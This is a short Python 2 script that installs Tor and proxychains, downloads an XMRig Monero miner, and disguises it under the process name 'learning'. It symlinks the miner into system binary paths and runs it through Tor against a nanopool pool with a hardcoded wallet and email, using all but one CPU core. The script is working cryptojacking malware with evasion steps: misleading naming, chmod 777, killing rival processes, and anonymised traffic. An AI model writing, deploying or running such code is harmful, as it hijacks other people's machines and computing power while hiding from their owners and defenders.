__author__ = 'root'
import time
import urllib2
import urllib
import os,sys
from httplib import BadStatusLine
from socket import error as socket_error
import multiprocessing
import ast
useproxy = 0
os.system('chmod 777 ' + __file__)
program = 'learning'
os.system('pkill ' + program)
cores = multiprocessing.cpu_count() - 1
if cores <= 0:
    cores = 1
os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
try:
    os.system('apt-get update -y')
    os.system('apt-get install gcc make tor python python-dev -y')
    os.system('rm -rf proxychains-ng')
    os.system('git clone https://github.com/ts6aud5vkg/proxychains-ng.git')
    os.chdir('proxychains-ng')
    os.system('make')
    os.system('make install')
    os.system('make install-config')
    if os.path.isfile('/usr/local/bin/' + program) == False:
        os.system('wget https://github.com/phucnhpd00841/mine/blob/master/xmrig-mine.gz/' + program)
                        
        os.system('chmod 777 ' + program)
        workingdir = os.getcwd()
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
        os.system('ln -s -f ' + workingdir + '/' + program + ' ' + '/usr/bin/' + program)
        time.sleep (2)
except:
    pass
os.system('tor &')
time.sleep(60)
os.system ('proxychains4 ' + program + ' --donate-level 1 -o xmr-us-west1.nanopool.org:14443 -u 49f3dHJVP9ZNX5A8T1YuLVN2gS1aTPtwCRsejM7DiLgEjQDJL5fUTVvBL5wCAK8QEbaN3g4dDpbeKHWBTkL2Zs5zE8RfWqs.orcfullaz/phucnhpd00841@gmail.com -p az -a rx/0 -k --tls -t ' + str(cores))
